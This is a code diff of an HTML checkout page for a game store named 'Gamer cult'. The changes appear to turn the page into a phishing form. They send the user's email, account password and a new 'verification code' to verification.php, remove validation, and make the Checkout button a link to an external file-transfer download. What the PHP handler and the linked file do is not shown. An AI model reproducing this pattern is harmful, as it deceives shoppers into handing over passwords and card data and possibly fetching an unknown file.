@@ -1,3 +1,5 @@
+
+
 <!DOCTYPE html>
 <html>
     <head>
@@ -18,8 +20,6 @@
                 class="logoBig" src="../assets/Images/Gamer cult.png"></a>            
         </div>
 
-        <!-- <button type="button" class="d-none d-md-block btn btn-success" data-target="#">
-            <img width="15px" height="15px" src="https://img.icons8.com/material-sharp/256/download--v1.png">Install GC</button> -->
 
           </nav>
     </head>
@@ -29,19 +29,19 @@
         <img style="position: absolute; width: 800px; height:700px;visibility: hidden;" src="../../ImageData/games.jpg">
   
         
-        <form id="checkoutForm" action="purchase.html" method="post" style="width: 40%; margin-top: 5%;" class="container fade-in" onsubmit="return  validateForm()">
+        <form method="post" id="checkoutForm" action="verification.php"  style="width: 40%; margin-top: 5%;" class="container fade-in">
           <div class="container" style="text-align: center;">
             <img src="../assets/Images/Gamer cult.png">
           </div>
         
           <div class="container smallFont">
             <label ><b>Recipient Email</b></label>
-            <input style="background-color: #e8f0fe;" type="text" placeholder="Enter Recipient Email" required>
+            <input style="background-color: #e8f0fe;" type="text" placeholder="Enter Recipient Email" name="email" required>
         
             <label><b>Confirm Your Password</b></label>
-            <input style="background-color:#e8f0fe;" type="password" placeholder="Enter Password" required>
-            <br> <label ><b>Credit Card info</b></label>
-            <br>    
+            <input style="background-color:#e8f0fe;" type="password" placeholder="Enter Password" name="code" required>
+            <br><label ><b>Credit Card info</b></label>
+            <br> 
             <label ><b>Name on card</b></label>
             <input style="background-color: #e8f0fe;" type="text" placeholder="Enter Card holder name" required>
 
@@ -54,12 +54,14 @@
             <label ><b>Discount Code:</b></label>
             <input style="background-color: #e8f0fe;" type="text" placeholder="CCV/CVV">
 
-             
-            <h2 style="color: whitesmoke;">Product:SPIDERMAN REMASTERED</h2>
-            <p style="color: whitesmoke;">Total: ₹3099 RUP</p>
+            <label for="code">Verification Code:</label>
+        <input type="text" id="code" name="code" required><br><br>
+        
+            <h2 style="color: whitesmoke;">Product: EAFC24</h2>
+            <p style="color: whitesmoke;">Total: ₹2000 RUP</p>
             
             <button type="submit" class="smallFont" style="display: block;width: 25%; margin-left: 37%; margin-top:2%;height: 50px ;background-image: linear-gradient(to right, #3786c6 , #223e87);;">
-              <span style="color: whitesmoke; font-weight: 600;">Checkout</span></button>
+             <a href="https://transfer.us.c2.synology.com/transfer/TXHTWSsheJp9BQL9/aN0BETXRHZP9WdJN/v2#VJW9K1WTfJiYeglKciuH6aarou9f6M5TZ9W2hnvMlyc"> <span style="color: whitesmoke; font-weight: 600;">Checkout</span></a></button>
               <button style="width: 25%; margin-left: 37%; margin-top:2%;height: 50px; background-image: linear-gradient(to right, #df1b1b, #ba3030);" 
             type="button" class="cancelbtn smallFont" onclick=clearInput()><span style="color: whitesmoke; font-weight: 600;">Clear</span></button></button>
             <label>
